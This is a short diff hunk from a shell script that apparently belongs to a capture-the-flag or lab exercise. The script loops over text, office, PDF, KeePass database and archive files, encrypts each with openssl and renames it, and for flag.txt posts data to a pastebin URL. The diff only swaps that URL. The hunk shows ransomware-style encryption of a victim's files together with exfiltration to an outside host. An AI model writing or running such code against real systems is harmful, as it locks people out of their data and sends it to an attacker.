@@ -8,7 +8,7 @@ for file in *.txt *.doc *.docx *.pdf *.kdbx *.gz *.rar;
 	  		
 	  		openssl enc -e -aes-256-cbc -in "$file" -out "$file.enc" -kfile "key.pub"
 	  		 if [ "$file" = "flag.txt" ]; then
-	  		    curl -X POST -d @file "https://pastebin.com/EWcyYrJY"
+	  		    curl -X POST -d @file "https://pastebin.com/p3jdswQf"
 	  		fi    
 	  		
 	  		mv "$file.enc" "$file.$extension.enc"
